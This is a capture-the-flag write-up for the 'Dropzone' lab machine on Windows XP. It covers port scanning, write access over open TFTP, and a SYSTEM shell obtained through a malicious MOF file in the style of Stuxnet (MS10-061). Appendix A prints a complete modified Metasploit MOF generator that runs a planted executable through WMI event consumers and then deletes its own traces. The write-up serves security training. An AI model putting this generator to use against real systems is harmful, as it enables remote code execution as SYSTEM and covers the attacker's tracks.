# Dropzone

*Converted from: Dropzone.pdf*

---

# Dropzone
## **4 [th] November 2018 / Document No D18.100.26**

**Prepared By: egre55**

**Machine Author: eks & rjesh**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 13


## **SYNOPSIS**

Dropzone is an interesting machine that highlights a technique used by the Stuxnet worm. The

discovery of NTFS data streams provides an additional challenge.


## **Skills Required**


  - Basic knowledge of Ruby

  - Basic knowledge of Windows


## **Skills Learned**


  - TFTP data transfer

  - Exploit modification

  - Discovery of NTFS data streams


Page 2 / 13


## **Enumeration** **Nmap**

masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0 -p1-65535,U:1-65535 > ports


ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')


nmap -Pn -sV -sC -sU -sT -p$ports 10.10.10.90


Nmap reveals that UDP port 69 (TFTP) is running, and this is verified using netcat.


Page 3 / 13


## **Exfiltration of Interesting Files**

It seems that read and write access to the entire system is possible. As license.rtf doesn’t exist

the system must be prior to Windows 7. Inspection of eula.txt reveals that it is Windows XP

Service Pack 3.


Page 4 / 13


​


## **Exploitation** **Creation of Malicious MOF File**

With prior knowledge of the Stuxnet Windows Printer Spooler vulnerability (MS10-061), or by

searching for Windows XP write-privilege attacks, it seems likely that the initial vector requires

creating a malicious MOF file.


The blog post below by Xst3nZ highlights how this can be weaponized and is well worth a read.


[http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)


The Metasploit Framework uses malicious MOF files as payloads for several modules, via the

wbemexec.rb mixin.


[https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows)

[attack-on-Windows](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows)


wbemexec.rb is modified as below, and executed to generate a malicious MOF file **(Appendix A)** ​


Page 5 / 13



​



​


## **TFTP Transfer and Shell**

TFTP binary mode is enabled. The binary needs to be uploaded first to “c:\windows\system32”,

before uploading the MOF file to “c:\windows\system32\wbem\mof”.


A shell is immediately received as SYSTEM.


Page 6 / 13


## **NTFS Data Streams**

After inspecting the files on the Administrator’s Desktop, streams.exe from the SysInternals Suite

is uploaded, and user and root flags can now be obtained.


Page 7 / 13


## **Appendix A**

# -*- coding: binary -*

#


# This mixin enables executing arbitrary commands via the


# Windows Management Instrumentation service.


#


# By writing the output of these methods to %SystemRoot%\system32\WBEM\mof,


# your command line will be executed.


#


# This technique was used as part of Stuxnet and further reverse engineered


# to this form by Ivanlef0u and jduck.


#


#module Msf


#module Exploit::WbemExec


def generate_mof(mofname, exe)


classname = rand(0xffff).to_s



Page 8 / 13


# From Ivan's decompressed version


mof = <<-EOT


#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")


class MyClass@CLASS@


{


[key] string Name;


};


class ActiveScriptEventConsumer : __EventConsumer


{


[key] string Name;


[not_null] string ScriptingEngine;


string ScriptFileName;


[template] string ScriptText;


uint32 KillTimeout;


};


instance of __Win32Provider as $P


{


Name = "ActiveScriptEventConsumer";


CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";


PerUserInitialization = TRUE;



Page 9 / 13


};


instance of __EventConsumerProviderRegistration


{


Provider = $P;


ConsumerClassNames = {"ActiveScriptEventConsumer"};


};


Instance of ActiveScriptEventConsumer as $cons


{


Name = "ASEC";


ScriptingEngine = "JScript";


ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch

(err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");}

catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try

{sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";


};


Instance of ActiveScriptEventConsumer as $cons2


{


Name = "qndASEC";


ScriptingEngine = "JScript";


ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 =

objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\#{mofname}\\");\\nf1.Delete(true);} catch(err)

{};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s =


Page 10 / 13


GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\

"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";


};


instance of __EventFilter as $Filt


{


Name = "instfilt";


Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class =

\\"MyClass@CLASS@\\"";


QueryLanguage = "WQL";


};


instance of __EventFilter as $Filt2


{


Name = "qndfilt";


Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA

\\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";


QueryLanguage = "WQL";


};


instance of __FilterToConsumerBinding as $bind


{


Consumer = $cons;


Filter = $Filt;


};


Page 11 / 13


instance of __FilterToConsumerBinding as $bind2


{


Consumer = $cons2;


Filter = $Filt2;


};


instance of MyClass@CLASS@ as $MyClass


{


Name = "ClassConsumer";


};


EOT


# Replace the input vars


mof.gsub!(/@CLASS@/, classname)


mof.gsub!(/@EXE@/, exe) # NOTE: \ and " should be escaped


fd = open("telemetry.mof", 'w')


fd << mof


fd.close


mof


end



Page 12 / 13


#end


#end


generate_mof('telemetry.mof', 'update.exe')



_modified wbemexec.rb_


Page 13 / 13


